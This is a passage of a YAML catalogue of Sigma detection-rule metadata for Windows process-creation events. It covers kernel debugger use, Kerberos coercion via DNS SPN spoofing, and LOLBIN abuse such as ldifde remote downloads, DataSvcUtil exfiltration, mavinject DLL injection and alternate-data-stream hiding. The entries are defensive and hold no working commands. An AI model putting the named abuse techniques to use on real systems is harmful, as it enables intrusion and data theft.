  notes: ''
- detection_id: 27ee9438-90dc-4bef-904b-d3ef927f5e7e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_kd_execution.yml
  name: Windows Kernel Debugger Execution
  description: Detects execution of the Windows Kernel Debugger "kd.exe".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Rare occasions of legitimate cases where kernel debugging is necessary in production.
    Investigation is required
  notes: ''
- detection_id: 0ed99dda-6a35-11ef-8c99-0242ac120002
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_kerberos_coercion_via_dns_spn_spoofing.yml
  name: Attempts of Kerberos Coercion Via DNS SPN Spoofing
  description: 'Detects the presence of "UWhRC....AAYBAAAA" pattern in command line.

    The pattern "1UWhRCAAAAA..BAAAA" is a base64-encoded signature that corresponds
    to a marshaled CREDENTIAL_TARGET_INFORMATION structure.

    Attackers can use this technique to coerce authentication from victim systems
    to attacker-controlled hosts.

    It is one of the strong indicators of a Kerberos coercion attack, where adversaries
    manipulate DNS records

    to spoof Service Principal Names (SPNs) and redirect authentication requests like
    in CVE-2025-33073.

    If you see this pattern in the command line, it is likely an attempt to add spoofed
    Service Principal Names (SPNs) to DNS records,

    or checking for the presence of such records through the `nslookup` command.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  - Persistence
  techniques:
  - T1187
  - T1557.001
  tags:
  - attack.collection
  - attack.credential-access
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1557.001
  - attack.t1187
  time_window: ''
  references:
  - https://www.synacktiv.com/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025
  - https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: ca5583e9-8f80-46ac-ab91-7f314d13b984
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_keyscrambler_susp_child_process.yml
  name: Potentially Suspicious Child Process of KeyScrambler.exe
  description: Detects potentially suspicious child processes of KeyScrambler.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1203
  - T1574.001
  tags:
  - attack.persistence
  - attack.execution
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1203
  - attack.t1574.001
  time_window: ''
  references:
  - https://twitter.com/DTCERT/status/1712785421845790799
  false_positives:
  - Unknown
  notes: ''
- detection_id: de16d92c-c446-4d53-8938-10aeef41c8b6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_ksetup_password_change_computer.yml
  name: Computer Password Change Via Ksetup.EXE
  description: Detects password change for the computer's domain account or host principal
    via "ksetup.exe"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://twitter.com/Oddvarmoe/status/1641712700605513729
  - https://learn.microsoft.com/en-gb/windows-server/administration/windows-commands/ksetup
  false_positives:
  - Unknown
  notes: ''
- detection_id: c9783e20-4793-4164-ba96-d9ee483992c4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_ksetup_password_change_user.yml
  name: Logged-On User Password Change Via Ksetup.EXE
  description: Detects password change for the logged-on user's via "ksetup.exe"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://learn.microsoft.com/en-gb/windows-server/administration/windows-commands/ksetup
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4f7a6757-ff79-46db-9687-66501a02d9ec
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_ldifde_export.yml
  name: Active Directory Structure Export Via Ldifde.EXE
  description: Detects the execution of "ldifde.exe" in order to export organizational
    Active Directory structure.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Exfiltration
  techniques: []
  tags:
  - attack.exfiltration
  time_window: ''
  references:
  - https://businessinsights.bitdefender.com/deep-dive-into-a-backdoordiplomacy-attack-a-study-of-an-attackers-toolkit
  - https://www.documentcloud.org/documents/5743766-Global-Threat-Report-2019.html
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731033(v=ws.11)
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6f535e01-ca1f-40be-ab8d-45b19c0c8b7f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_ldifde_file_load.yml
  name: Import LDAP Data Interchange Format File Via Ldifde.EXE
  description: 'Detects the execution of "Ldifde.exe" with the import flag "-i". The
    can be abused to include HTTP-based arguments which will allow the arbitrary download
    of files from a remote server.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  - T1218
  tags:
  - attack.command-and-control
  - attack.defense-evasion
  - attack.t1218
  - attack.t1105
  time_window: ''
  references:
  - https://twitter.com/0gtweet/status/1564968845726580736
  - https://strontic.github.io/xcyclopedia/library/ldifde.exe-979DE101F5059CEC1D2C56967CA2BAC0.html
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731033(v=ws.11)
  false_positives:
  - Since the content of the files are unknown, false positives are expected
  notes: ''
- detection_id: 6e968eb1-5f05-4dac-94e9-fd0c5cb49fd6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_link_uncommon_parent_process.yml
  name: Uncommon Link.EXE Parent Process
  description: 'Detects an uncommon parent process of "LINK.EXE".

    Link.EXE in Microsoft incremental linker. Its a utility usually bundled with Visual
    Studio installation.

    Multiple utilities often found in the same folder (editbin.exe, dumpbin.exe, lib.exe,
    etc) have a hardcode call to the "LINK.EXE" binary without checking its validity.

    This would allow an attacker to sideload any binary with the name "link.exe" if
    one of the aforementioned tools get executed from a different location.

    By filtering the known locations of such utilities we can spot uncommon parent
    process of LINK.EXE that might be suspicious or malicious.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://twitter.com/0gtweet/status/1560732860935729152
  false_positives:
  - Unknown
  notes: ''
- detection_id: cc9d3712-6310-4320-b2df-7cb408274d53
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lodctr_performance_counter_tampering.yml
  name: Rebuild Performance Counter Values Via Lodctr.EXE
  description: Detects the execution of "lodctr.exe" to rebuild the performance counter
    registry values. This can be abused by attackers by providing a malicious config
    file to overwrite performance counter configuration to confuse and evade monitoring
    and security solutions.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/security/identity-protection/virtual-smart-cards/virtual-smart-card-tpmvscmgr
  false_positives:
  - Legitimate usage by an administrator
  notes: ''
- detection_id: cd1f961e-0b96-436b-b7c6-38da4583ec00
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_logman_disable_eventlog.yml
  name: Suspicious Windows Trace ETW Session Tamper Via Logman.EXE
  description: Detects the execution of "logman" utility in order to disable or delete
    Windows trace sessions
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1070.001
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  - attack.t1070.001
  time_window: ''
  references:
  - https://twitter.com/0gtweet/status/1359039665232306183?s=21
  - https://ss64.com/nt/logman.html
  false_positives:
  - Legitimate deactivation by administrative staff
  - Installer tools that disable services, e.g. before log collection agent installation
  notes: ''
- detection_id: e290b10b-1023-4452-a4a9-eb31a9013b3a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil.yml
  name: LOLBAS Data Exfiltration by DataSvcUtil.exe
  description: Detects when a user performs data exfiltration by using DataSvcUtil.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1567
  tags:
  - attack.exfiltration
  - attack.t1567
  time_window: ''
  references:
  - https://gist.github.com/teixeira0xfffff/837e5bfed0d1b0a29a7cb1e5dbdd9ca6
  - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/wcf/wcf-data-service-client-utility-datasvcutil-exe
  - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/wcf/generating-the-data-service-client-library-wcf-data-services
  - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/wcf/how-to-add-a-data-service-reference-wcf-data-services
  - https://lolbas-project.github.io/lolbas/Binaries/DataSvcUtil/
  false_positives:
  - DataSvcUtil.exe being used may be performed by a system administrator.
  - Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - DataSvcUtil.exe being executed from unfamiliar users should be investigated. If
    known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_devtoolslauncher.yml
  name: Devtoolslauncher.exe Executes Specified Binary
  description: The Devtoolslauncher.exe executes other binary
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Devtoolslauncher/
  - https://twitter.com/_felamos/status/1179811992841797632
  false_positives:
  - Legitimate use of devtoolslauncher.exe by legitimate user
  notes: ''
- detection_id: 6b369ced-4b1d-48f1-b427-fdc0de0790bd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_diantz_ads.yml
  name: Suspicious Diantz Alternate Data Stream Execution
  description: Compress target file into a cab file stored in the Alternate Data Stream
    (ADS) of the target file.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.t1564.004
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Diantz/
  false_positives:
  - Very Possible
  notes: ''
- detection_id: 185d7418-f250-42d0-b72e-0c8b70661e93
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_diantz_remote_cab.yml
  name: Suspicious Diantz Download and Compress Into a CAB File
  description: Download and compress a remote file and store it in a cab file on local
    machine.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Diantz/
  false_positives:
  - Unknown
  notes: ''
- detection_id: aa8e035d-7be4-48d3-a944-102aec04400d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_extrac32.yml
  name: Suspicious Extrac32 Execution
  description: Download or Copy file with Extrac32
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Extrac32/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4b13db67-0c45-40f1-aba8-66a1a7198a1e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_extrac32_ads.yml
  name: Suspicious Extrac32 Alternate Data Stream Execution
  description: Extract data from cab file and hide it in an alternate data stream
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.t1564.004
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Extrac32/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 575dce0c-8139-4e30-9295-1ee75969f7fe
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_gather_network_info.yml
  name: Potential Reconnaissance Activity Via GatherNetworkInfo.VBS
  description: Detects execution of the built-in script located in "C:\Windows\System32\gatherNetworkInfo.vbs".
    Which can be used to gather information about the target machine
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1059.005
  - T1615
  tags:
  - attack.discovery
  - attack.execution
  - attack.t1615
  - attack.t1059.005
  time_window: ''
  references:
  - https://posts.slayerlabs.com/living-off-the-land/#gathernetworkinfovbs
  - https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government
  false_positives:
  - Administrative activity
  notes: ''
- detection_id: 1e59c230-6670-45bf-83b0-98903780607e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_gpscript.yml
  name: Gpscript Execution
  description: Detects the execution of the LOLBIN gpscript, which executes logon
    or startup scripts configured in Group Policy
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/
  - https://lolbas-project.github.io/lolbas/Binaries/Gpscript/
  false_positives:
  - Legitimate uses of logon scripts distributed via group policy
  notes: ''
- detection_id: d3bf399f-b0cf-4250-8bb4-dfc192ab81dc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_ie4uinit.yml
  name: Ie4uinit Lolbin Use From Invalid Path
  description: Detect use of ie4uinit.exe to execute commands from a specially prepared
    ie4uinit.inf file from a directory other than the usual directories
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/
  - https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/
  false_positives:
  - ViberPC updater calls this binary with the following commandline "ie4uinit.exe
    -ClearIconCache"
  notes: ''
- detection_id: 45d3a03d-f441-458c-8883-df101a3bb146
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_launch_vsdevshell.yml
  name: Launch-VsDevShell.PS1 Proxy Execution
  description: Detects the use of the 'Launch-VsDevShell.ps1' Microsoft signed script
    to execute commands.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1216.001
  tags:
  - attack.defense-evasion
  - attack.t1216.001
  time_window: ''
  references:
  - https://twitter.com/nas_bench/status/1535981653239255040
  false_positives:
  - Legitimate usage of the script by a developer
  notes: ''
- detection_id: c363385c-f75d-4753-a108-c1a8e28bdbda
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_manage_bde.yml
  name: Potential Manage-bde.wsf Abuse To Proxy Execution
  description: Detects potential abuse of the "manage-bde.wsf" script as a LOLBIN
    to proxy execution
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1216
  tags:
  - attack.defense-evasion
  - attack.t1216
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Scripts/Manage-bde/
  - https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712
  - https://twitter.com/bohops/status/980659399495741441
  - https://twitter.com/JohnLaTwC/status/1223292479270600706
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1216/T1216.md
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 4f73421b-5a0b-4bbf-a892-5a7fb99bea66
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_mavinject_process_injection.yml
  name: Mavinject Inject DLL Into Running Process
  description: Detects process injection using the signed Windows tool "Mavinject"
    via the "INJECTRUNNING" flag
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1055.001
  - T1218.013
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055.001
  - attack.t1218.013
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1056.004/T1056.004.md
  - https://posts.specterops.io/mavinject-exe-functionality-deconstructed-c29ab2cf5c0e
  - https://twitter.com/gN3mes1s/status/941315826107510784
  - https://reaqta.com/2017/12/mavinject-microsoft-injector/
  - https://twitter.com/Hexacorn/status/776122138063409152
  - https://github.com/SigmaHQ/sigma/issues/3742
  - https://github.com/keyboardcrunch/SentinelOne-ATTACK-Queries/blob/6a228d23eefe963ca81f2d52f94b815f61ef5ee0/Tactics/DefenseEvasion.md#t1055-process-injection
  false_positives:
  - Unknown
  notes: ''
- detection_id: 729ce0ea-5d8f-4769-9762-e35de441586d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_mpiexec.yml
  name: MpiExec Lolbin
  description: Detects a certain command line flag combination used by mpiexec.exe
    LOLBIN from HPC pack that can be used to execute any other binary
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://twitter.com/mrd0x/status/1465058133303246867
  - https://learn.microsoft.com/en-us/powershell/high-performance-computing/mpiexec?view=hpc19-ps
  false_positives:
  - Unknown
  notes: ''
- detection_id: 646bc99f-6682-4b47-a73a-17b1b64c9d34
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_msdeploy.yml
  name: Execute Files with Msdeploy.exe
  description: Detects file execution using the msdeploy.exe lolbin
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msdeploy/
  - https://twitter.com/pabraeken/status/995837734379032576
  - https://twitter.com/pabraeken/status/999090532839313408
  false_positives:
  - System administrator Usage
  notes: ''
- detection_id: 814c95cc-8192-4378-a70a-f1aafd877af1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_openconsole.yml
  name: Use of OpenConsole
  description: Detects usage of OpenConsole binary as a LOLBIN to launch other binaries
    to bypass application Whitelisting
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://twitter.com/nas_bench/status/1537563834478645252
  false_positives:
  - Legitimate use by an administrator
  notes: ''
- detection_id: cec8e918-30f7-4e2d-9bfa-a59cc97ae60f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_openwith.yml
  name: OpenWith.exe Executes Specified Binary
  description: The OpenWith.exe executes other binary
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://github.com/LOLBAS-Project/LOLBAS/blob/4db780e0f0b2e2bb8cb1fa13e09196da9b9f1834/yml/LOLUtilz/OSBinaries/Openwith.yml
  - https://twitter.com/harr0ey/status/991670870384021504
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0955e4e1-c281-4fb9-9ee1-5ee7b4b754d2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_pcalua.yml
  name: Use of Pcalua For Execution
  description: Detects execition of commands and binaries from the context of The
    program compatibility assistant (Pcalua.exe). This can be used as a LOLBIN in
    order to bypass application whitelisting.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Pcalua/
  - https://pentestlab.blog/2020/07/06/indirect-command-execution/
  false_positives:
  - Legitimate use by a via a batch script or by an administrator.
  notes: ''
- detection_id: b97cd4b1-30b8-4a9d-bd72-6293928d52bc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_pcwrun.yml
  name: Indirect Command Execution By Program Compatibility Wizard
  description: Detect indirect command execution via Program Compatibility Assistant
    pcwrun.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  - attack.execution
  time_window: ''
  references:
  - https://twitter.com/pabraeken/status/991335019833708544
  - https://lolbas-project.github.io/lolbas/Binaries/Pcwrun/
  false_positives:
  - Need to use extra processing with 'unique_count' / 'filter' to focus on outliers
    as opposed to commonly seen artifacts
  - Legit usage of scripts
  notes: ''
- detection_id: 6004abd0-afa4-4557-ba90-49d172e0a299
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_pcwrun_follina.yml
  name: Execute Pcwrun.EXE To Leverage Follina
  description: Detects indirect command execution via Program Compatibility Assistant
    "pcwrun.exe" leveraging the follina (CVE-2022-30190) vulnerability
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  - attack.execution
  time_window: ''
  references:
  - https://twitter.com/nas_bench/status/1535663791362519040
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9386d78a-7207-4048-9c9f-a93a7c2d1c05
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_pcwutl.yml
  name: Code Execution via Pcwutl.dll
  description: Detects launch of executable by calling the LaunchApplication function
    from pcwutl.dll library.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Libraries/Pcwutl/
  - https://twitter.com/harr0ey/status/989617817849876488
  false_positives:
  - Use of Program Compatibility Troubleshooter Helper
  notes: ''
- detection_id: 18988e1b-9087-4f8a-82fe-0414dce49878
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_pester.yml
  name: Execute Code with Pester.bat as Parent
  description: Detects code execution via Pester.bat (Pester - Powershell Modulte
    for testing)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1216
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense-evasion
  - attack.t1216
  time_window: ''
  references:
  - https://twitter.com/Oddvarmoe/status/993383596244258816
  - https://twitter.com/_st0pp3r_/status/1560072680887525378
  false_positives:
  - Legitimate use of Pester for writing tests for Powershell scripts and modules
  notes: ''
- detection_id: 59e938ff-0d6d-4dc3-b13f-36cc28734d4e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_lolbin_pester_1.yml
  name: Execute Code with Pester.bat
  description: Detects code execution via Pester.bat (Pester - Powershell Modulte
    for testing)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1216
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense-evasion
  - attack.t1216
  time_window: ''
  references:
